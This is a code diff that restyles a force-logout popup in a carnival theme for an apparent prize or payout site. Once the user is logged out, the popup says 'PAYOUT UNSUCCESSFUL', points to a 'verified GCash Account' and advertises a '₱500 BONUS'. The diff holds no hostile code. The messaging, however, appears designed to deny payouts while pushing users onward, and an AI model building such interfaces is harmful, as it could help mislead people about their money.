@@ -1621,96 +1621,126 @@
         console.log('✅ Admin logout listeners ready');
     }
     
-    // ============================================================
-    // FORCE LOGOUT POPUP
+        // ============================================================
+    // FORCE LOGOUT POPUP — FILIPINO CARNIVAL REMASTER
     // ============================================================
     function showForceLogoutPopup() {
         if (document.querySelector('.force-logout-popup')) return;
-        
+
         addForceLogoutAnimations();
-        
+
+        // ===== OVERLAY =====
         var overlay = document.createElement('div');
-        overlay.className = 'force-logout-popup';
-        overlay.style.cssText = 
-            'position: fixed; inset: 0;' +
-            'background: radial-gradient(ellipse at center, rgba(20, 0, 0, 0.98), rgba(0, 0, 0, 0.99));' +
-            'backdrop-filter: blur(15px); z-index: 999999;' +
-            'display: flex; align-items: center; justify-content: center;' +
-            'animation: fadeInForceLogout 0.4s ease; padding: 20px;';
-        
-        var particles = document.createElement('div');
-        particles.style.cssText = 'position: absolute; inset: 0; overflow: hidden; pointer-events: none;';
-        
-        for (var i = 0; i < 30; i++) {
-            var particle = document.createElement('div');
-            var size = Math.random() * 4 + 2;
+        overlay.className = 'force-logout-popup carnival-overlay';
+
+        // ===== CONFETTI LAYER =====
+        var confettiLayer = document.createElement('div');
+        confettiLayer.className = 'carnival-confetti-layer';
+
+        var confettiColors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
+        var confettiShapes = ['circle', 'square', 'ribbon'];
+
+        for (var i = 0; i < 45; i++) {
+            var piece = document.createElement('div');
+            var color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
+            var shape = confettiShapes[Math.floor(Math.random() * confettiShapes.length)];
+            var size = Math.random() * 10 + 6;
             var startX = Math.random() * 100;
-            var delay = Math.random() * 3;
-            var duration = Math.random() * 3 + 2;
-            particle.style.cssText = 
-                'position: absolute; top: -10px; left: ' + startX + '%;' +
-                'width: ' + size + 'px; height: ' + size + 'px;' +
-                'background: rgba(255, 215, 0, ' + (Math.random() * 0.5 + 0.3) + ');' +
-                'border-radius: 50%;' +
-                'animation: floatDownForceLogout ' + duration + 's ' + delay + 's linear infinite;';
-            particles.appendChild(particle);
+            var delay = Math.random() * 4;
+            var duration = Math.random() * 4 + 3;
+            var rotate = Math.random() * 360;
+
+            piece.className = 'carnival-confetti ' + shape;
+            piece.style.cssText =
+                'left: ' + startX + '%;' +
+                'width: ' + size + 'px;' +
+                'height: ' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
+                'background: ' + color + ';' +
+                'box-shadow: 0 0 ' + (size * 1.5) + 'px ' + color + ';' +
+                'animation: carnivalFall ' + duration + 's ' + delay + 's linear infinite;' +
+                'transform: rotate(' + rotate + 'deg);';
+            confettiLayer.appendChild(piece);
         }
-        overlay.appendChild(particles);
-        
+        overlay.appendChild(confettiLayer);
+
+        // ===== GLOWING WHITE CENTER BURST =====
+        var centerBurst = document.createElement('div');
+        centerBurst.className = 'carnival-center-burst';
+        overlay.appendChild(centerBurst);
+
+        // ===== MAIN CARD =====
         var card = document.createElement('div');
-        card.style.cssText = 
-            'position: relative; z-index: 1;' +
-            'background: linear-gradient(160deg, #1a0000 0%, #2a0000 40%, #0d0000 100%);' +
-            'border: 3px solid rgba(255, 215, 0, 0.6);' +
-            'border-radius: 24px; padding: 35px 28px 28px;' +
-            'text-align: center; max-width: 360px; width: 100%;' +
-            'box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 215, 0, 0.3);' +
-            'animation: cardEnterForceLogout 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);';
-        
-        card.innerHTML = 
-            '<div style="width: 90px; height: 90px; margin: 0 auto 16px;' +
-            'background: radial-gradient(circle, rgba(255, 68, 68, 0.9), rgba(139, 0, 0, 0.95));' +
-            'border-radius: 50%; display: flex; align-items: center; justify-content: center;' +
-            'border: 3px solid #ffd700; box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);">' +
-                '<span style="font-size: 44px;">💸</span>' +
+        card.className = 'carnival-card';
+
+        card.innerHTML =
+            '<div class="carnival-ribbon-left">🎪</div>' +
+            '<div class="carnival-ribbon-right">🎟️</div>' +
+
+            '<div class="carnival-mascot-wrap">' +
+                '<div class="carnival-mascot-glow"></div>' +
+                '<div class="carnival-mascot-ring"></div>' +
+                '<div class="carnival-mascot">🐱</div>' +
+                '<div class="carnival-mascot-star star-1">✨</div>' +
+                '<div class="carnival-mascot-star star-2">⭐</div>' +
+                '<div class="carnival-mascot-star star-3">✨</div>' +
             '</div>' +
-            
-            '<div style="display: inline-block; background: rgba(255, 68, 68, 0.2);' +
-            'border: 1px solid rgba(255, 68, 68, 0.5); border-radius: 20px;' +
-            'padding: 5px 16px; margin-bottom: 12px;' +
-            'font-family: "Orbitron", monospace; font-size: 9px; font-weight: 700;' +
-            'color: #ff6666; letter-spacing: 2px; text-transform: uppercase;">● Session Ended</div>' +
-            
-            '<h2 style="font-family: "Playfair Display", serif; font-size: 24px; font-weight: 900;' +
-            'background: linear-gradient(to bottom, #fff9c4 0%, #ffd700 50%, #ff9800 100%);' +
-            '-webkit-background-clip: text; background-clip: text; color: transparent;' +
-            'margin: 0 0 10px 0; letter-spacing: 2px; text-transform: uppercase;">PAYOUT UNSUCCESSFUL</h2>' +
-            
-            '<div style="font-family: "Poppins", sans-serif; font-size: 14px;' +
-            'color: #ccc; line-height: 1.7; margin: 0 0 22px 0;">' +
-                'Your payout request is <span style="color: #ff6666; font-weight: 700;">unsuccessful</span>.<br><br>' +
-                'Use <strong style="color: #fff9c4;">verified GCash Account</strong><br>' +
+
+            '<div class="carnival-badge">' +
+                '<span class="carnival-badge-dot"></span>' +
+                '<span>SESSION ENDED</span>' +
+            '</div>' +
+
+            '<h2 class="carnival-title">PAYOUT UNSUCCESSFUL</h2>' +
+
+            '<div class="carnival-divider">' +
+                '<span class="divider-star">★</span>' +
+                '<span class="divider-line"></span>' +
+                '<span class="divider-star">★</span>' +
+            '</div>' +
+
+            '<p class="carnival-message">' +
+                'Your payout request is <strong>unsuccessful</strong>.<br>' +
+                'Use a <span class="carnival-highlight">verified GCash Account</span><br>' +
                 'to process instant withdrawal.' +
+            '</p>' +
+
+            '<div class="carnival-chips">' +
+                '<div class="carnival-chip">' +
+                    '<span class="chip-icon">🎁</span>' +
+                    '<span class="chip-text">₱500 BONUS</span>' +
+                '</div>' +
+                '<div class="carnival-chip">' +
+                    '<span class="chip-icon">⚡</span>' +
+                    '<span class="chip-text">INSTANT</span>' +
+                '</div>' +
+                '<div class="carnival-chip">' +
+                    '<span class="chip-icon">🔒</span>' +
+                    '<span class="chip-text">SECURED</span>' +
+                '</div>' +
             '</div>' +
-            
-            '<button id="returnHomeBtn" style="width: 100%;' +
-            'background: linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);' +
-            'border: 3px solid #fff9c4; border-radius: 14px; padding: 16px 24px;' +
-            'font-family: "Orbitron", monospace; font-size: 14px; font-weight: 900;' +
-            'color: #8b0000; cursor: pointer; letter-spacing: 2px;' +
-            'text-transform: uppercase;' +
-            'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6);">🏠 RETURN TO HOME</button>';
-        
+
+            '<button id="returnHomeBtn" class="carnival-btn">' +
+                '<span class="btn-icon">🏠</span>' +
+                '<span class="btn-text">RETURN TO HOME</span>' +
+                '<span class="btn-shine"></span>' +
+            '</button>' +
+
+            '<div class="carnival-footer">' +
+                '<span>🎊</span> LUCKY DROP CARNIVAL <span>🎊</span>' +
+            '</div>';
+
         overlay.appendChild(card);
         document.body.appendChild(overlay);
-        
-        document.getElementById('returnHomeBtn').onclick = function() {
+
+        // ===== CTA ACTION =====
+        document.getElementById('returnHomeBtn').onclick = function () {
             localStorage.clear();
             sessionStorage.clear();
             window.location.replace('index.html');
         };
-        
-        setTimeout(function() {
+
+        // ===== AUTO-REDIRECT FALLBACK =====
+        setTimeout(function () {
             if (document.querySelector('.force-logout-popup')) {
                 localStorage.clear();
                 sessionStorage.clear();
@@ -1718,16 +1748,425 @@
             }
         }, 15000);
     }
-    
+
+    // ============================================================
+    // FORCE LOGOUT STYLES — CARNIVAL THEME
+    // ============================================================
     function addForceLogoutAnimations() {
         if (document.querySelector('#force-logout-animations')) return;
-        
+
         var style = document.createElement('style');
         style.id = 'force-logout-animations';
-        style.textContent = 
-            '@keyframes fadeInForceLogout { from { opacity: 0; } to { opacity: 1; } }' +
-            '@keyframes cardEnterForceLogout { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 60% { transform: scale(1.03) translateY(-5px); } 100% { transform: scale(1) translateY(0); opacity: 1; } }' +
-            '@keyframes floatDownForceLogout { 0% { transform: translateY(-10px); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(105vh); opacity: 0; } }';
+        style.textContent =
+
+        /* ===== OVERLAY ===== */
+        '.carnival-overlay {' +
+            'position: fixed;' +
+            'inset: 0;' +
+            'z-index: 999999;' +
+            'display: flex;' +
+            'align-items: center;' +
+            'justify-content: center;' +
+            'padding: 16px;' +
+            'background: ' +
+                'radial-gradient(circle at 50% 40%, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0.08) 15%, transparent 45%),' +
+                'radial-gradient(circle at 50% 50%, #ff3b3b 0%, #d10000 25%, #8b0000 55%, #3d0000 80%, #0d0000 100%);' +
+            'backdrop-filter: blur(8px);' +
+            '-webkit-backdrop-filter: blur(8px);' +
+            'overflow: hidden;' +
+            'animation: carnivalFadeIn 0.4s ease;' +
+        '}' +
+
+        /* ===== CONFETTI ===== */
+        '.carnival-confetti-layer {' +
+            'position: absolute;' +
+            'inset: 0;' +
+            'overflow: hidden;' +
+            'pointer-events: none;' +
+            'z-index: 1;' +
+        '}' +
+
+        '.carnival-confetti {' +
+            'position: absolute;' +
+            'top: -20px;' +
+            'opacity: 0.9;' +
+        '}' +
+
+        '.carnival-confetti.circle { border-radius: 50%; }' +
+        '.carnival-confetti.square { border-radius: 2px; }' +
+        '.carnival-confetti.ribbon { border-radius: 3px; }' +
+
+        /* ===== GLOWING CENTER BURST ===== */
+        '.carnival-center-burst {' +
+            'position: absolute;' +
+            'top: 50%;' +
+            'left: 50%;' +
+            'width: 380px;' +
+            'height: 380px;' +
+            'transform: translate(-50%, -50%);' +
+            'background: radial-gradient(circle, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0.15) 25%, transparent 65%);' +
+            'border-radius: 50%;' +
+            'pointer-events: none;' +
+            'animation: carnivalBurstPulse 3s ease-in-out infinite;' +
+            'z-index: 2;' +
+        '}' +
+
+        /* ===== MAIN CARD ===== */
+        '.carnival-card {' +
+            'position: relative;' +
+            'z-index: 3;' +
+            'width: 100%;' +
+            'max-width: 380px;' +
+            'padding: 42px 26px 26px;' +
+            'background: ' +
+                'linear-gradient(180deg, rgba(255,255,255,0.18) 0%, transparent 25%),' +
+                'linear-gradient(160deg, #ff1744 0%, #d10000 35%, #8b0000 70%, #4a0000 100%);' +
+            'border: 4px solid #ffd700;' +
+            'border-radius: 28px;' +
+            'text-align: center;' +
+            'box-shadow: ' +
+                '0 30px 80px rgba(0,0,0,0.85),' +
+                '0 0 0 8px rgba(255,23,68,0.25),' +
+                '0 0 60px rgba(255,215,0,0.6),' +
+                'inset 0 0 60px rgba(255,255,255,0.08);' +
+            'animation: carnivalCardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
+            'overflow: hidden;' +
+            'box-sizing: border-box;' +
+        '}' +
+
+        '.carnival-card::before {' +
+            'content: "";' +
+            'position: absolute;' +
+            'top: 0;' +
+            'left: 0;' +
+            'right: 0;' +
+            'height: 3px;' +
+            'background: linear-gradient(90deg, transparent, #fff9c4, #ffd700, #fff9c4, transparent);' +
+            'animation: carnivalShine 2.5s linear infinite;' +
+        '}' +
+
+        /* ===== RIBBONS ===== */
+        '.carnival-ribbon-left, .carnival-ribbon-right {' +
+            'position: absolute;' +
+            'top: -8px;' +
+            'font-size: 28px;' +
+            'animation: carnivalFloat 3s ease-in-out infinite;' +
+            'filter: drop-shadow(0 0 12px rgba(255,215,0,0.9));' +
+        '}' +
+        '.carnival-ribbon-left { left: 14px; animation-delay: 0s; }' +
+        '.carnival-ribbon-right { right: 14px; animation-delay: 1.2s; }' +
+
+        /* ===== MASCOT (Lucky Cat) ===== */
+        '.carnival-mascot-wrap {' +
+            'position: relative;' +
+            'width: 130px;' +
+            'height: 130px;' +
+            'margin: 0 auto 16px;' +
+        '}' +
+
+        '.carnival-mascot-glow {' +
+            'position: absolute;' +
+            'inset: -20px;' +
+            'background: radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,23,68,0.4) 40%, transparent 70%);' +
+            'border-radius: 50%;' +
+            'animation: carnivalGlowPulse 2s ease-in-out infinite;' +
+        '}' +
+
+        '.carnival-mascot-ring {' +
+            'position: absolute;' +
+            'inset: 0;' +
+            'border: 3px dashed #ffd700;' +
+            'border-radius: 50%;' +
+            'animation: carnivalSpin 12s linear infinite;' +
+            'box-shadow: 0 0 30px rgba(255,215,0,0.8), inset 0 0 30px rgba(255,215,0,0.5);' +
+        '}' +
+
+        '.carnival-mascot {' +
+            'position: absolute;' +
+            'top: 50%;' +
+            'left: 50%;' +
+            'transform: translate(-50%, -50%);' +
+            'font-size: 68px;' +
+            'filter: drop-shadow(0 8px 20px rgba(0,0,0,0.6)) drop-shadow(0 0 25px rgba(255,215,0,0.9));' +
+            'animation: carnivalMascotBounce 2s ease-in-out infinite;' +
+            'z-index: 2;' +
+        '}' +
+
+        '.carnival-mascot-star {' +
+            'position: absolute;' +
+            'font-size: 18px;' +
+            'animation: carnivalStarPop 2s ease-in-out infinite;' +
+            'filter: drop-shadow(0 0 8px currentColor);' +
+        '}' +
+        '.star-1 { top: 0; right: 0; color: #ffd700; animation-delay: 0s; }' +
+        '.star-2 { bottom: 0; left: 0; color: #ff2d95; animation-delay: 0.6s; }' +
+        '.star-3 { top: 30%; left: -5px; color: #00d4ff; animation-delay: 1.2s; }' +
+
+        /* ===== BADGE ===== */
+        '.carnival-badge {' +
+            'display: inline-flex;' +
+            'align-items: center;' +
+            'gap: 8px;' +
+            'padding: 6px 18px;' +
+            'margin-bottom: 12px;' +
+            'background: rgba(0,0,0,0.45);' +
+            'border: 2px solid rgba(255,68,68,0.9);' +
+            'border-radius: 20px;' +
+            'font-family: "Orbitron", monospace;' +
+            'font-size: 10px;' +
+            'font-weight: 800;' +
+            'color: #ff8888;' +
+            'letter-spacing: 2.5px;' +
+            'text-transform: uppercase;' +
+            'box-shadow: 0 0 20px rgba(255,68,68,0.5), inset 0 0 15px rgba(255,68,68,0.2);' +
+        '}' +
+
+        '.carnival-badge-dot {' +
+            'width: 8px;' +
+            'height: 8px;' +
+            'background: #ff3b3b;' +
+            'border-radius: 50%;' +
+            'box-shadow: 0 0 10px #ff3b3b, 0 0 20px #ff3b3b;' +
+            'animation: carnivalBlink 1s ease-in-out infinite;' +
+        '}' +
+
+        /* ===== TITLE ===== */
+        '.carnival-title {' +
+            'font-family: "Playfair Display", serif;' +
+            'font-size: 26px;' +
+            'font-weight: 900;' +
+            'margin: 0 0 6px 0;' +
+            'letter-spacing: 1.5px;' +
+            'text-transform: uppercase;' +
+            'line-height: 1.15;' +
+            'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 80%, #ff6f00 100%);' +
+            '-webkit-background-clip: text;' +
+            'background-clip: text;' +
+            'color: transparent;' +
+            'filter: drop-shadow(0 2px 0 rgba(139,0,0,0.8)) drop-shadow(0 0 20px rgba(255,215,0,0.7));' +
+        '}' +
+
+        /* ===== DIVIDER ===== */
+        '.carnival-divider {' +
+            'display: flex;' +
+            'align-items: center;' +
+            'justify-content: center;' +
+            'gap: 10px;' +
+            'margin: 14px auto;' +
+            'width: 75%;' +
+        '}' +
+        '.divider-star {' +
+            'font-size: 14px;' +
+            'color: #ffd700;' +
+            'text-shadow: 0 0 12px rgba(255,215,0,0.9);' +
+        '}' +
+        '.divider-line {' +
+            'flex: 1;' +
+            'height: 2px;' +
+            'background: linear-gradient(90deg, transparent, #ffd700, #ff2d95, #ffd700, transparent);' +
+            'border-radius: 2px;' +
+            'box-shadow: 0 0 8px rgba(255,215,0,0.6);' +
+        '}' +
+
+        /* ===== MESSAGE ===== */
+        '.carnival-message {' +
+            'font-family: "Poppins", sans-serif;' +
+            'font-size: 13px;' +
+            'line-height: 1.7;' +
+            'color: rgba(255,255,255,0.92);' +
+            'margin: 0 0 18px 0;' +
+            'text-shadow: 0 1px 3px rgba(0,0,0,0.6);' +
+        '}' +
+        '.carnival-message strong {' +
+            'color: #ff6b6b;' +
+            'font-weight: 800;' +
+            'text-shadow: 0 0 10px rgba(255,107,107,0.7);' +
+        '}' +
+        '.carnival-highlight {' +
+            'display: inline-block;' +
+            'padding: 2px 8px;' +
+            'background: linear-gradient(180deg, #ffd700, #ff9800);' +
+            '-webkit-background-clip: text;' +
+            'background-clip: text;' +
+            'color: transparent;' +
+            'font-weight: 900;' +
+            'text-shadow: 0 0 15px rgba(255,215,0,0.8);' +
+        '}' +
+
+        /* ===== CHIPS ===== */
+        '.carnival-chips {' +
+            'display: flex;' +
+            'justify-content: center;' +
+            'gap: 6px;' +
+            'margin-bottom: 20px;' +
+            'flex-wrap: wrap;' +
+        '}' +
+
+        '.carnival-chip {' +
+            'display: flex;' +
+            'align-items: center;' +
+            'gap: 4px;' +
+            'padding: 6px 10px;' +
+            'background: rgba(0,0,0,0.4);' +
+            'border: 1.5px solid rgba(255,215,0,0.6);' +
+            'border-radius: 12px;' +
+            'font-family: "Orbitron", monospace;' +
+            'font-size: 8.5px;' +
+            'font-weight: 800;' +
+            'color: #ffd700;' +
+            'letter-spacing: 1px;' +
+            'text-transform: uppercase;' +
+            'box-shadow: 0 0 12px rgba(255,215,0,0.3), inset 0 0 8px rgba(255,215,0,0.1);' +
+            'animation: carnivalChipFloat 3s ease-in-out infinite;' +
+        '}' +
+        '.carnival-chip:nth-child(2) { animation-delay: 0.5s; }' +
+        '.carnival-chip:nth-child(3) { animation-delay: 1s; }' +
+
+        '.chip-icon { font-size: 11px; }' +
+
+        /* ===== CTA BUTTON ===== */
+        '.carnival-btn {' +
+            'position: relative;' +
+            'width: 100%;' +
+            'padding: 16px 20px;' +
+            'display: flex;' +
+            'align-items: center;' +
+            'justify-content: center;' +
+            'gap: 10px;' +
+            'background: linear-gradient(180deg, #fff9c4 0%, #ffeb3b 20%, #ffd700 45%, #ff9800 75%, #ff6f00 100%);' +
+            'border: 3px solid #fff9c4;' +
+            'border-radius: 16px;' +
+            'font-family: "Orbitron", monospace;' +
+            'font-size: 14px;' +
+            'font-weight: 900;' +
+            'color: #8b0000;' +
+            'letter-spacing: 2px;' +
+            'text-transform: uppercase;' +
+            'cursor: pointer;' +
+            'overflow: hidden;' +
+            'box-shadow: ' +
+                '0 6px 0 #8b4500,' +
+                '0 12px 30px rgba(0,0,0,0.6),' +
+                '0 0 40px rgba(255,215,0,0.6),' +
+                'inset 0 2px 0 rgba(255,255,255,0.7);' +
+            'transition: transform 0.1s ease, box-shadow 0.1s ease;' +
+            'animation: carnivalBtnPulse 2s ease-in-out infinite;' +
+        '}' +
+
+        '.carnival-btn:active {' +
+            'transform: translateY(6px);' +
+            'box-shadow: 0 0 0 #8b4500, 0 4px 15px rgba(0,0,0,0.5);' +
+        '}' +
+
+        '.btn-icon { font-size: 18px; }' +
+
+        '.btn-shine {' +
+            'position: absolute;' +
+            'top: 0;' +
+            'left: -100%;' +
+            'width: 60%;' +
+            'height: 100%;' +
+            'background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);' +
+            'transform: skewX(-25deg);' +
+            'animation: carnivalBtnShine 2.5s ease-in-out infinite;' +
+            'pointer-events: none;' +
+        '}' +
+
+        /* ===== FOOTER ===== */
+        '.carnival-footer {' +
+            'margin-top: 16px;' +
+            'font-family: "Orbitron", monospace;' +
+            'font-size: 9px;' +
+            'font-weight: 700;' +
+            'color: rgba(255,215,0,0.85);' +
+            'letter-spacing: 3px;' +
+            'text-transform: uppercase;' +
+            'text-shadow: 0 0 10px rgba(255,215,0,0.6);' +
+        '}' +
+
+        /* ===== ANIMATIONS ===== */
+        '@keyframes carnivalFadeIn { from { opacity: 0; } to { opacity: 1; } }' +
+
+        '@keyframes carnivalCardEnter {' +
+            '0% { transform: scale(0.7) translateY(40px); opacity: 0; }' +
+            '60% { transform: scale(1.04) translateY(-6px); }' +
+            '100% { transform: scale(1) translateY(0); opacity: 1; }' +
+        '}' +
+
+        '@keyframes carnivalFall {' +
+            '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }' +
+            '10% { opacity: 1; }' +
+            '90% { opacity: 1; }' +
+            '100% { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
+        '}' +
+
+        '@keyframes carnivalBurstPulse {' +
+            '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }' +
+            '50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }' +
+        '}' +
+
+        '@keyframes carnivalGlowPulse {' +
+            '0%, 100% { transform: scale(1); opacity: 0.8; }' +
+            '50% { transform: scale(1.15); opacity: 1; }' +
+        '}' +
+
+        '@keyframes carnivalSpin {' +
+            'from { transform: rotate(0deg); }' +
+            'to { transform: rotate(360deg); }' +
+        '}' +
+
+        '@keyframes carnivalMascotBounce {' +
+            '0%, 100% { transform: translate(-50%, -50%) scale(1) rotate(-3deg); }' +
+            '50% { transform: translate(-50%, -55%) scale(1.08) rotate(3deg); }' +
+        '}' +
+
+        '@keyframes carnivalStarPop {' +
+            '0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.8; }' +
+            '50% { transform: scale(1.4) rotate(180deg); opacity: 1; }' +
+        '}' +
+
+        '@keyframes carnivalBlink {' +
+            '0%, 100% { opacity: 1; }' +
+            '50% { opacity: 0.3; }' +
+        '}' +
+
+        '@keyframes carnivalFloat {' +
+            '0%, 100% { transform: translateY(0) rotate(-8deg); }' +
+            '50% { transform: translateY(-8px) rotate(8deg); }' +
+        '}' +
+
+        '@keyframes carnivalShine {' +
+            '0% { transform: translateX(-100%); }' +
+            '100% { transform: translateX(100%); }' +
+        '}' +
+
+        '@keyframes carnivalChipFloat {' +
+            '0%, 100% { transform: translateY(0); }' +
+            '50% { transform: translateY(-3px); }' +
+        '}' +
+
+        '@keyframes carnivalBtnPulse {' +
+            '0%, 100% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 40px rgba(255,215,0,0.6), inset 0 2px 0 rgba(255,255,255,0.7); }' +
+            '50% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 65px rgba(255,215,0,0.95), inset 0 2px 0 rgba(255,255,255,0.7); }' +
+        '}' +
+
+        '@keyframes carnivalBtnShine {' +
+            '0% { left: -100%; }' +
+            '60%, 100% { left: 150%; }' +
+        '}' +
+
+        /* ===== MOBILE ===== */
+        '@media (max-width: 420px) {' +
+            '.carnival-card { padding: 38px 20px 22px; border-radius: 24px; }' +
+            '.carnival-title { font-size: 22px; }' +
+            '.carnival-mascot-wrap { width: 110px; height: 110px; }' +
+            '.carnival-mascot { font-size: 58px; }' +
+            '.carnival-message { font-size: 12px; }' +
+            '.carnival-btn { padding: 14px 16px; font-size: 12px; }' +
+            '.carnival-chip { font-size: 7.5px; padding: 5px 8px; }' +
+            '.carnival-ribbon-left, .carnival-ribbon-right { font-size: 22px; }' +
+        '}';
+
         document.head.appendChild(style);
     }
     
